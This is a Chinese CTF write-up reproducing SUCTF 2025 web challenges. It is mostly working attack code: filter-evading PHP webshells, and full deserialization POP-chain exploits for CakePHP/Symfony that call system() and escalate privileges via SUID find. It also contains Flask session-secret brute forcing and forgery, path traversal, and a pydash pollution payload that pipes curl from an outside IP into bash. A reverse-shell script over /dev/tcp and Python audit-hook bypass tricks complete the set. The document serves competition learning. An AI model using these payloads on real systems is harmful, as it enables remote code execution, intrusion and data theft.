---
title: SUCTF 2025
subtitle:
date: 2025-01-24T10:20:38+08:00
slug: cc76721
draft: false
author:
  name: M1ng2u
  link: 
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - CTF
categories:
  - CTF
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRelated: false
hiddenFromFeed: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: true
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

# SUCTF 2025 （复现）

## web

### SU_photogallery

#### 0x00 信息收集

访问 /robots.txt ，提示 see see node.md

![image-20250124102801504](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/24/6792fab235ad0.png)

访问不存在的文件，出现下面这个界面

![image-20250124102531678](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/24/6792fa1ca4ee9.png)

看过 wp 之后，了解到这是在提示 php -S 启动的服务

#### 0x01 获取源码

参考：https://projectdiscovery.io/blog/php-http-server-source-disclosure

![image-20250124104646818](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/24/6792ff17c314d.png)

```php
<?php
/*
 * @Author: Nbc
 * @Date: 2025-01-13 16:13:46
 * @LastEditors: Nbc
 * @LastEditTime: 2025-01-13 16:31:53
 * @FilePath: \src\unzip.php
 * @Description: 
 * 
 * Copyright (c) 2025 by Nbc, All Rights Reserved. 
 */
error_reporting(0);

function get_extension($filename){
    return pathinfo($filename, PATHINFO_EXTENSION);
}
function check_extension($filename,$path){
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
    
    if (is_file($filePath)) {
        $extension = strtolower(get_extension($filename));

        if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
            if (!unlink($filePath)) {
                // echo "Fail to delete file: $filename\n";
                return false;
                }
            else{
                // echo "This file format is not supported:$extension\n";
                return false;
                }
    
        }
        else{
            return true;
            }
}
else{
    // echo "nofile";
    return false;
}
}
function file_rename ($path,$file){
    $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file);
                $oldPath = $path . DIRECTORY_SEPARATOR . $file;
                $newPath = $path . DIRECTORY_SEPARATOR . $randomName;

                if (!rename($oldPath, $newPath)) {
                    unlink($path . DIRECTORY_SEPARATOR . $file);
                    // echo "Fail to rename file: $file\n";
                    return false;
                }
                else{
                    return true;
                }
}

function move_file($path,$basePath){
    foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) {
        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
        if (!rename($file, $destination)){
            // echo "Fail to rename file: $file\n";
            return false;
        }
      
    }
    return true;
}


function check_base($fileContent){
    $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info'];
    $base64_keywords = [];
    foreach ($keywords as $keyword) {
        $base64_keywords[] = base64_encode($keyword);
    }
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword)!== false) {
            return true;

        }
        else{
           return false;

        }
    }
}

function check_content($zip){
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (preg_match('/\.\.(\/|\.|%2e%2e%2f)/i', $fileName)) {
            return false; 
        }
            // echo "Checking file: $fileName\n";
            $fileContent = $zip->getFromName($fileName);
            

            if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) {
                // echo "Don't hack me!\n";    
                return false;
            }
            else {
                continue;
            }
        }
    return true;
}

function unzip($zipname, $basePath) {
    $zip = new ZipArchive;

    if (!file_exists($zipname)) {
        // echo "Zip file does not exist";
        return "zip_not_found";
    }
    if (!$zip->open($zipname)) {
        // echo "Fail to open zip file";
        return "zip_open_failed";
    }
    if (!check_content($zip)) {
        return "malicious_content_detected";
    }
    $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999));
    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
    if (!mkdir($path, 0777, true)) {
        // echo "Fail to create directory";
        $zip->close();
        return "mkdir_failed";
    }
    if (!$zip->extractTo($path)) {
        // echo "Fail to extract zip file";
        $zip->close();
    }
    else{
        for ($i = 0; $i < $zip->numFiles; $i++) {
            $fileInfo = $zip->statIndex($i);
            $fileName = $fileInfo['name'];
            if (!check_extension($fileName, $path)) {
                // echo "Unsupported file extension";
                continue;
            }
            if (!file_rename($path, $fileName)) {
                // echo "File rename failed";
                continue;
            }
        }
    }

    if (!move_file($path, $basePath)) {
        $zip->close();
        // echo "Fail to move file";
        return "move_failed";
    }
    rmdir($path);
    $zip->close();
    return true;
}


$uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES['file'];
    $zipname = $uploadedFile['tmp_name'];
    $path = $uploadDir;

    $result = unzip($zipname, $path);
    if ($result === true) {
        header("Location: index.html?status=success");
        exit();
    } else {
        header("Location: index.html?status=$result");
        exit();
    }
} else {
    header("Location: index.html?status=file_error");
    exit();
}
```

做一下审计， `unzip()` 中解压失败时执行 `$zip->close();` 但并没有返回

所以可以构造压缩包，第一个文件放 shell ，后面放损坏的内容，使后一部分解压失败，关闭 zip 流，跳过文件拓展名检查和重命名，以保留 .php 文件

![image-20250125153507616](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794942c5ac08.png)

用 010editor 将下面的文件名改成 /////// 使解压失败

#### 0x02 绕过

先尝试 phpinfo

```php
<?php
$p = "ofniphp";
$pp = strrev($p);
$pp();
?>
```

`GET /upload/suimages/hack.php` 成功读到 phpinfo

马

```php
<?php
$p = "metsys";
$pp = strrev($p);
$pp($_POST['cmd']);
?>
```

![image-20250125160123692](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/67949a54a8b96.png)



### SU_POP

#### 0x00 参考资料

Symfony 反序列化链分析

参考文章：https://forum.butian.net/share/2411

在 `vendor/symfony/finder/Iterator/SortableIterator.php` 中定义了 `SortableIterator` 类，实现了 `IteratorAggregate` 接口

![image-20250125162940319](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794a0f577b69.png)

`__construct` 接受一个迭代器 `$iterator` ，整型或回调函数 `$sort` ，以及布尔类型 `$reverseOrder`

 如果传入一个 callable 的 `$sort` ，它将会被赋值给 `$this->sort` 

![image-20250125163327644](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794a1d864118.png)

那么在调用 `getIterator()` 时，对于上述的 `$sort` ，由于不等于 1 或 -1 ，将会调用 `uasort()`

> uasort([array](https://www.php.net/manual/en/language.types.array.php) `&$array`, [callable](https://www.php.net/manual/en/language.types.callable.php) `$callback`): true

`uasort()` 有两个参数，第一个参数是 array ，第二个参数是一个函数，而这两个参数在构造时可指定，即参数可控，那么可以传入 `call_user_func` 方法，实现任意命令执行

那么下面构造链子的思路是寻找类中 `__toString()` ，`__destruct()` ，`__wakeup()` 中直接或间接使用 `foreach` 遍历成员变量的部分

#### 0x01 代码审计

拿到源码，先找一下利用点，看路由

```php
<?php
use Cake\Routing\Route\DashedRoute;
use Cake\Routing\RouteBuilder;

return function (RouteBuilder $routes): void {
    $routes->setRouteClass(DashedRoute::class);
    $routes->scope('/', function (RouteBuilder $builder): void {
        $builder->connect('/', ['controller' => 'Pages', 'action' => 'display', 'home']);
        $builder->connect('/pages/*', 'Pages::display');
        $builder->get('/ser', ['controller' => 'Pages', 'action' => 'handleSer']);
        $builder->fallbacks();
    });
};
```

看起来利用点应该在 `/ser` ，查看一下 `handleSer`

```php
public function handleSer()
{
    $ser = $this->request->getQuery('ser');
    unserialize(base64_decode($ser));     
    $this->set('ser', $ser);
    $this->viewBuilder()->setLayout('ajax');
    $this->render('handle_ser');
}
```

确定了利用点，并且参数是 `ser` ，下面找反序列化的入口

搜索 `__destruct` ，最终找到 `/vender/react/promise/src/Internal/RejectedPromise.php` 的 `__destruct` 触发了 `__toString`

![image-20250125172633400](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794ae4a40c04.png)

由于 `$handler = set_rejection_handler(null);` 永远返回 `null` ，且 `$this->handled` 和 ` $this->reason` 参数可控，所以这个 `__toString` 总会触发，下面找 `__toString`

![image-20250125173451647](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794b03c3f59a.png)

有两个可能可以利用的

第一个是 `/vendor/composer/composer/src/Composer/DependencyResolver/Pool.php` ，找到了 `foreach`

![image-20250125174445521](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794b28e449ce.png)

第二个是 `/vendor/cakephp/cakephp/src/Http/Response.php` ， `stream` 可控

![image-20250125173939476](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794b15c293f8.png)

#### 0x02 POP1

由于 `packages` 可控，所以链子是

```pop
RejectedPromise::__destruct()->Pool::__toString()->SortableIterator::getIterator()
```

吗？

不是，因为附件版本的 `SortableIterator` 中指定了： `private \Closure|int $sort;` 所以如果将字符串 `"call_user_func"` 赋值给 `$sort` 的话，将不能成功序列化/反序列化，所以另寻他类，找一个有 `getIterator()` 方法的类

搜索到的第一个就是，最轻松的一回， `/vendor/cakephp/cakephp/src/Collection/Iterator` 

![image-20250125235829913](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/67950a268eb75.png)

`$this->_executed` 可控，看一下 `_execute()` 方法

```php
protected function _execute(): void
{
    $mapper = $this->_mapper;
    foreach ($this->_data as $key => $val) {
        $mapper($val, $key, $this);
    }

    if ($this->_intermediate && $this->_reducer === null) {
        throw new LogicException('No reducer function was provided');
    }

    $reducer = $this->_reducer;
    if ($reducer !== null) {
        foreach ($this->_intermediate as $key => $list) {
            $reducer($list, $key, $this);
        }
    }
    $this->_intermediate = [];
    $this->_executed = true;
}
```

这样的话 `$mapper` 和 `$reducer` 都可以用来执行命令，我这里使用 `$mapper`

所以要利用的链子是

```pop
RejectedPromise::__destruct()->Pool::__toString()->MapReduce::_execute()
```



 

poc 如下

```php
<?php

namespace React\Promise\Internal;
use Composer\DependencyResolver\Pool;
class RejectedPromise {
    private $reason;
    private $handled = false;
    public function __construct() {
        $this->reason = new Pool();
    }
}

namespace Composer\DependencyResolver;
use Cake\Collection\Iterator\MapReduce;
class Pool {
    protected $packages = [];
    public function __construct() {
        $this->packages = new MapReduce();
    }
}

namespace Cake\Collection\Iterator;
class MapReduce {
    protected bool $_executed = false;
    protected iterable $_data;
    protected $_mapper;
    public function __construct() {
        $this->_mapper = "call_user_func";
        // $cmd = "ls /";
        // $cmd = "cat /flag.txt";
        // $cmd = "find / -perm -u=s -type f 2>/dev/null";
        // $cmd = "find / -name flag.txt -exec whoami \;";
        $cmd = "find / -name flag.txt -exec cat /flag.txt \;";
        $this->_data = [$cmd=>"system"];
    }
}

namespace React\Promise\Internal;
echo base64_encode(serialize(new RejectedPromise()));

?>
```

`GET /ser?ser=xxxx` ， `ls`  `find` 之类的命令可以执行且有回显，但是 `cat /flag.txt` 无回显，之前学长提到过 suid 提权（从 www-data 提到 root），试一下能不能行

`find / -perm -u=s -type f 2>/dev/null` ，可以看到 `find` 有 suid 权限

```bash
/usr/bin/chsh
/usr/bin/find
/usr/bin/chfn
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
```

执行 `find / -name flag.txt -exec whoami \;` ，返回 root ，提权成功

执行 `find / -name flag.txt -exec cat /flag.txt \;` ，拿到 flag

![image-20250126001404890](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67950dcd85cce.png)

#### 0x03 POP2

这是另一条链子，跟 0x00 背景知识没什么关系

`stream` 可控的情况下，可以调用任意类的 `__call` 方法

`/vendor/cakephp/cakephp/src/ORM/Table.php` ，`$method` 、 `$this->_behaviors` 可控，所以 `hasMethod($method)` 可控制永远为 true ，但是 `$args` 不可控

![image-20250125214317076](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794ea75d8335.png)

所以需要找一个能够 rce 的地方，且需要执行方法与函数形参无关（与成员变量有关）

`/vendor/phpunit/phpunit/src/Framework/MockObject/Generator/MockTrait.php` （或者  `MockClass.php` ），找到

![image-20250125215333731](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794ecde54da9.png)

其中 `classCode` 和 `mockName` 均可控

链子找到了：

```pop
RejectedPromise::__destruct()->Response::__toString()->Table::__call()->MockTrait::generate()
```

poc 如下

```php
<?php

namespace React\Promise\Internal;
use Cake\Http\Response;
class RejectedPromise {
    private $reason;
    private $handled = false;
    public function __construct() {
        $this->reason = new Response();
    }
}

namespace Cake\Http;
use Cake\ORM\Table;
class Response {
    private $stream;
    public function __construct() {
        $this->stream = new Table();
    }
}

namespace Cake\ORM;
use PHPUnit\Framework\MockObject\Generator\MockTrait;
class Table {
    protected BehaviorRegistry $_behaviors;
    public function __construct() {
        $this->_behaviors = new BehaviorRegistry();
    }
}
class ObjectRegistry {}
class BehaviorRegistry extends ObjectRegistry {
    protected array $_methodMap;
    protected array $_loaded;
    public function __construct() {
        $this->_methodMap = ["rewind"=>array("mz","generate")];
        $this->_loaded = ["mz"=>new MockTrait()];
    }
}

namespace PHPUnit\Framework\MockObject\Generator;
class MockTrait {
    private string $classCode;
    private string $mockName;
    public function __construct() {
        $this->mockName = "mz";
        // $this->classCode = "phpinfo();";
        // $cmd = "ls /";
        $cmd = "find / -name flag.txt -exec cat /flag.txt \;";
        $this->classCode = 'system("'.$cmd.'");';
    }
}

namespace React\Promise\Internal;
echo base64_encode(serialize(new RejectedPromise()));

?>
```

同样的， suid 提权，读 flag

![image-20250125230928194](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/25/6794fea8c91e0.png)

> SUCTF{PoP_CHaiN5_@Re_SO_fUn!!!}

### SU_blog

#### 0x00 信息收集

注册一个 admin 用户（竟然让注册）

登陆后提示 md5 + 时间戳 生成了 SECRET

![image-20250126002940921](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67951175a0760.png)

结合 Cookie 中的 jwt ，推测是 jwt 的 secretkey

#### 0x01 session 伪造

虽然允许注册 admin 用户，但是还是伪造一下 session 吧，wp 看到是非预期

之前用的是 flask-session-cookie-manager ，不能爆破， 官方 wp 给出 flask-unsign ，工具++

生成字典

```python
import time
import hashlib

wordlist = []
timestamp = int(time.time())
for i in range(timestamp - 1000000, timestamp + 1000000):
    wordlist.append(hashlib.md5(str(i).encode()).hexdigest())

with open("/home/mingzu/CTF/wordlist.txt", "w") as f:
    for word in wordlist:
        f.write(word + "\n")
```

```bash
> flask-unsign -u -c "eyJ1c2VybmFtZSI6Im1pbmd6dSJ9.Z5UV3g.v4iJ--zejF0WE-AetwuuqaYPy-A" --wordlist wordlist.txt --no-literal-eval
[*] Session decodes to: {'username': 'mingzu'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 996480 attempts2acb53068c17
b'c78e2cbce1051488f1f616939660a68d'
```

爆破出 secret ，伪造 session

```bash
> flask-unsign -s -c "{'username': 'admin'}" --secret 'c78e2cbce1051488f1f616939660a68d'
eyJ1c2VybmFtZSI6ImFkbWluIn0.Z5UfEw.PWO_FglQqS-u7lTOfsl_BCMEzeE
```

#### 0x02 获取源码

点开 article ，`GET /article?file=` 的形式感觉是文件包含，读 `articles/../articles/article1.txt`  提示文件未找到，尝试双写绕过，路径正确

![image-20250126003414160](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67951286e540b.png)

读 `/etc/passwd` 确定相对路径

![image-20250126003721334](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/6795134240df1.png)

读 `/flag` 返回读取文件时发生错误，不让直接读

`GET /article?file=articles/..././app.py` 拿到 app.py

```python
from flask import *
import time,os,json,hashlib
from pydash import set_
from waf import pwaf,cwaf

app = Flask(__name__)
app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest()

users = {"testuser": "password"}
BASE_DIR = '/var/www/html/myblog/app'

articles = {
    1: "articles/article1.txt",
    2: "articles/article2.txt",
    3: "articles/article3.txt"
}

friend_links = [
    {"name": "bkf1sh", "url": "https://ctf.org.cn/"},
    {"name": "fushuling", "url": "https://fushuling.com/"},
    {"name": "yulate", "url": "https://www.yulate.com/"},
    {"name": "zimablue", "url": "https://www.zimablue.life/"},
    {"name": "baozongwi", "url": "https://baozongwi.xyz/"},
]

class User():
    def __init__(self):
        pass

user_data = User()
@app.route('/')
def index():
    if 'username' in session:
        return render_template('blog.html', articles=articles, friend_links=friend_links)
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in users and users[username] == password:
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials", 403
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        users[username] = password
        return redirect(url_for('login'))
    return render_template('register.html')


@app.route('/change_password', methods=['GET', 'POST'])
def change_password():
    if 'username' not in session:
        return redirect(url_for('login'))

    if request.method == 'POST':
        old_password = request.form['old_password']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        if users[session['username']] != old_password:
            flash("Old password is incorrect", "error")
        elif new_password != confirm_password:
            flash("New passwords do not match", "error")
        else:
            users[session['username']] = new_password
            flash("Password changed successfully", "success")
            return redirect(url_for('index'))

    return render_template('change_password.html')


@app.route('/friendlinks')
def friendlinks():
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))
    return render_template('friendlinks.html', links=friend_links)


@app.route('/add_friendlink', methods=['POST'])
def add_friendlink():
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))

    name = request.form.get('name')
    url = request.form.get('url')

    if name and url:
        friend_links.append({"name": name, "url": url})

    return redirect(url_for('friendlinks'))


@app.route('/delete_friendlink/<int:index>')
def delete_friendlink(index):
    if 'username' not in session or session['username'] != 'admin':
        return redirect(url_for('login'))

    if 0 <= index < len(friend_links):
        del friend_links[index]

    return redirect(url_for('friendlinks'))

@app.route('/article')
def article():
    if 'username' not in session:
        return redirect(url_for('login'))

    file_name = request.args.get('file', '')
    if not file_name:
        return render_template('article.html', file_name='', content="未提供文件名。")

    blacklist = ["waf.py"]
    if any(blacklisted_file in file_name for blacklisted_file in blacklist):
        return render_template('article.html', file_name=file_name, content="大黑阔不许看")
    
    if not file_name.startswith('articles/'):
        return render_template('article.html', file_name=file_name, content="无效的文件路径。")
    
    if file_name not in articles.values():
        if session.get('username') != 'admin':
            return render_template('article.html', file_name=file_name, content="无权访问该文件。")
    
    file_path = os.path.join(BASE_DIR, file_name)
    file_path = file_path.replace('../', '')
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
    except FileNotFoundError:
        content = "文件未找到。"
    except Exception as e:
        app.logger.error(f"Error reading file {file_path}: {e}")
        content = "读取文件时发生错误。"

    return render_template('article.html', file_name=file_name, content=content)


@app.route('/Admin', methods=['GET', 'POST'])
def admin():
    if request.args.get('pass')!="SUers":
        return "nonono"
    if request.method == 'POST':
        try:
            body = request.json

            if not body:
                flash("No JSON data received", "error")
                return jsonify({"message": "No JSON data received"}), 400

            key = body.get('key')
            value = body.get('value')

            if key is None or value is None:
                flash("Missing required keys: 'key' or 'value'", "error")
                return jsonify({"message": "Missing required keys: 'key' or 'value'"}), 400

            if not pwaf(key):
                flash("Invalid key format", "error")
                return jsonify({"message": "Invalid key format"}), 400

            if not cwaf(value):
                flash("Invalid value format", "error")
                return jsonify({"message": "Invalid value format"}), 400

            set_(user_data, key, value)

            flash("User data updated successfully", "success")
            return jsonify({"message": "User data updated successfully"}), 200

        except json.JSONDecodeError:
            flash("Invalid JSON data", "error")
            return jsonify({"message": "Invalid JSON data"}), 400
        except Exception as e:
            flash(f"An error occurred: {str(e)}", "error")
            return jsonify({"message": f"An error occurred: {str(e)}"}), 500

    return render_template('admin.html', user_data=user_data)


@app.route('/logout')
def logout():
    session.pop('username', None)
    flash("You have been logged out.", "info")
    return redirect(url_for('login'))



if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```

康康 waf.py ，在黑名单里，但因为 `../` 会被去掉，所以能绕过去

```py
key_blacklist = [
    '__file__', 'app', 'router', 'name_index',
    'directory_handler', 'directory_view', 'os', 'path', 'pardir', '_static_folder',
    '__loader__', '0',  '1', '3', '4', '5', '6', '7', '8', '9',
]

value_blacklist = [
    'ls', 'dir', 'nl', 'nc', 'cat', 'tail', 'more', 'flag', 'cut', 'awk',
    'strings', 'od', 'ping', 'sort', 'ch', 'zip', 'mod', 'sl', 'find',
    'sed', 'cp', 'mv', 'ty', 'grep', 'fd', 'df', 'sudo', 'more', 'cc', 'tac', 'less',
    'head', '{', '}', 'tar', 'zip', 'gcc', 'uniq', 'vi', 'vim', 'file', 'xxd',
    'base64', 'date', 'env', '?', 'wget', '"', 'id', 'whoami', 'readflag'
]

# 将黑名单转换为字节串
key_blacklist_bytes = [word.encode() for word in key_blacklist]
value_blacklist_bytes = [word.encode() for word in value_blacklist]

def check_blacklist(data, blacklist):
    for item in blacklist:
        if item in data:
            return False
    return True

def pwaf(key):
    # 将 key 转换为字节串
    key_bytes = key.encode()
    if not check_blacklist(key_bytes, key_blacklist_bytes):
        print(f"Key contains blacklisted words.")
        return False
    return True

def cwaf(value):
    if len(value) > 77:
        print("Value exceeds 77 characters.")
        return False
    
    # 将 value 转换为字节串
    value_bytes = value.encode()
    if not check_blacklist(value_bytes, value_blacklist_bytes):
        print(f"Value contains blacklisted words.")
        return False
    return True
```

`/Admin` 里面用到了 `pydash.set_(user_data, key, value)` ，查到是原型链污染，但是过滤的有点多

#### 0x03 反弹 shell  

![image-20250126183105768](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67960eeb1e8fe.png)

payload ，参考：https://ctftime.org/writeup/36082

```json
{
	"key": "__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2",
	"value": "*;__import__('os').system('curl http://47.76.93.208:8000/hack.sh | bash');#"
}
```

hack.sh

```sh
bash -c "bash -i >& /dev/tcp/47.76.93.208/2333 0>&1"
```

访问渲染 admin.html 的页面，点了一下 back to home ，触发反弹

![image-20250126183241888](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67960f4a9aefe.png)

![image-20250126183306944](https://mingzu.oss-cn-hongkong.aliyuncs.com/2025/01/26/67960f639a255.png)

> SUCTF{fl4sk_1s_5imp1e_bu7_pyd45h_1s_n0t_s0_I_l0v3}



### SU_easyk8s

k8s 用都没用过，一点头猪没有，也没搜到太多有用的东西，直接看 wp 吧

#### 0x00 Python Audit Hook RCE

什么玩意，没听说过，查：https://xz.aliyun.com/news/15665

> Audit Hook 是 python 3.8 中引入的特性，使用审计狗子来监控和记录程序运行行为，特别是安全敏感行为，如文件读写、网络通信和动态代码执行等
>
> 审计事件包括但不限于：
>
> `import` : 导入模块
>
> `open` : 打开文件
>
> `exec` : 执行代码
>
> `compile` : 编译代码
>
> `socket` : 创建或使用套接字
>
> `os.system` ， `os.popen` 等 : 执行操作系统命令
>
> `subprocess.popen` ， `subprocess.run` 等 : 启动子进程
>
> 等等

这种 pyjail 要 rce 查了查有好多种方法

```python
DEBUG = True
import os, sys
origin_print = print
def print(*args):
    # original_print(sys._getframe(1).f_locals)
    t = sys._getframe(1).f_locals['audit_functions']
    t['os.system']['ban'] = False
    # origin_print(t)
    return origin_print(*args)

os.system('ls')
```

第一次见，长见识了，先把原生 `print` 保存为 `origin_print` ，然后重写 `print`

访问调用栈上一级函数的局部变量，这里调用的是 `os.system` 的局部变量

1 是上一级帧，0 是当前帧，依此类推

```python
t = sys._getframe(1).f_locals
# {'event': 'os.system', 'args': (b'ls',), 'audit_functions': {'os.system': {'ban': False}, ... }}
```

修改 audit_functions 字典，/pardon `os.system` （什么方块人）

然后继续执行 `print(*args)` ，这样就实现了 rce

或者

可以用 `_posixsubprocess.fork_exec` 

> `posixsubprocess` 是内部模块，核心功能是 `fork_exec` 函数，提供了一个非常底层的方式创建子进程，并在子进程中执行指定程序

```python
import os
import _posixsubprocess

cmd = b"/bin/ls"
param = "."
_posixsubprocess.fork_exec([cmd, param], [cmd], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)
```

网上搜来的，一堆参数一眼看不明白，查查源码，每个版本之间可能有差异

```python
# _posixsubprocess.py
def fork_exec(*args, **kwargs): # real signature unknown
    """
    Spawn a fresh new child process.
    
    Fork a child process, close parent file descriptors as appropriate in the
    child and duplicate the few that are needed before calling exec() in the
    child process.
    
    If close_fds is True, close file descriptors 3 and higher, except those listed
    in the sorted tuple pass_fds.
    
    The preexec_fn, if supplied, will be called immediately before closing file
    descriptors and exec.
    
    WARNING: preexec_fn is NOT SAFE if your application uses threads.
             It may trigger infrequent, difficult to debug deadlocks.
    
    If an error occurs in the child process before the exec, it is
    serialized and written to the errpipe_write fd per subprocess.py.
    
    Returns: the child process's PID.
    
    Raises: Only on an error in the parent process.
    """
    pass
# _posixsubprocess.pyi
    def fork_exec(
        args: Sequence[StrOrBytesPath] | None,
        executable_list: Sequence[bytes],
        close_fds: bool,
        pass_fds: tuple[int, ...],
        cwd: str,
        env: Sequence[bytes] | None,
        p2cread: int,
        p2cwrite: int,
        c2pread: int,
        c2pwrite: int,
        errread: int,
        errwrite: int,
        errpipe_read: int,
        errpipe_write: int,
        restore_signals: int,
        call_setsid: int,
        pgid_to_set: int,
        gid: SupportsIndex | None,
        extra_groups: list[int] | None,
        uid: SupportsIndex | None,
        child_umask: int,
        preexec_fn: Callable[[], None],
        allow_vfork: bool,
        /,
    ) -> int: ...
```

对应起来：

```python
Sequence[StrOrBytesPath] | None 		= [cmd, param]
executable_list: Sequence[bytes]		= [cmd]
close_fds: bool							= True
pass_fds: tuple[int, ...]				= ()
cwd: str								= None
env: Sequence[bytes] | None				= None
p2cread: int							= -1
p2cwrite: int							= -1
c2pread: int							= -1
c2pwrite: int							= -1
errread: int							= -1
errwrite: int							= -1
errpipe_read: int						= *(os.pipe())[0]
errpipe_write: int						= *(os.pipe())[1]
restore_signals: int					= False
call_setsid: int						= False
pgid_to_set: int						= False
gid: SupportsIndex | None				= None
extra_groups: list[int] | None			= None
uid: SupportsIndex | None				= None
child_umask: int						= -1
preexec_fn: Callable[[], None]			= None
allow_vfork: bool						= False
```

把无效的配置去掉，得到

```python
Sequence[StrOrBytesPath] | None 		= [cmd, param]		# 命令及参数
executable_list: Sequence[bytes]		= [cmd]				# 命令路径
# os.pipe()创建一个 pipe ，返回两个文件描述符
errpipe_read: int						= *(os.pipe())[0]   
errpipe_write: int						= *(os.pipe())[1]
```

这样也能实现 rce

#### 0x01 k8s 信息泄漏

wp 说用 k8spider：https://github.com/Esonhugh/k8spider

环境没配好，k8s 之后再说
